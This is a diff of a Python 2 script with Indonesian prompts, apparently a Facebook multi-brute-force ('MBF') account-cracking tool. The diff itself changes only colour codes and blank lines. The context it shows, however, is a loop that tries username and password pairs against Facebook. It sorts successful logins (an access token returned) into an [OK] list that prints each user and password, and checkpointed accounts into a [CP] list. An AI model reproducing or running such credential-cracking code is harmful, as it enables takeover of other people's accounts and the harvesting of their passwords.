@@ -64,7 +64,7 @@ def logout():
     try:
         print k+" ["+pu+"1"+k+"]"+a+" Keluar Dari Program.."
         print k+" ["+pu+"2"+k+"]"+a+" Keluar Dari Akun Facebook.."
-        iqbal = raw_input(p+" [?]"+h+" Pilih Salah Satu.. "+a+"["+pu+" 1 / 2"+a+" ]: ")
+        iqbal = raw_input(p+" [?]"+h+" Pilih Salah Satu.. "+a+"["+pu+" 1 / 2"+a+" ]\033[97m: ")
         if iqbal == "1":
             print d+" Keluar Dari Program.."
         elif iqbal == "2":
@@ -214,6 +214,7 @@ def iqbaldevmbf():
             jsl = json.load(Iq_data)
             if count == len(baris):
                 break
+                
             elif "access_token" in jsl:
                 dados.append(h+" [OK] " + pu + user + " | " + a + password)
                 count += 1
@@ -222,6 +223,7 @@ def iqbaldevmbf():
             elif "www.facebook.com" in jsl["error_msg"]:
                 gagal.append(m+" [CP] " + d + user + " | " + m + password)
                 count += 1
+                
             else:
                 oradadi.append(user)
                 count += 1
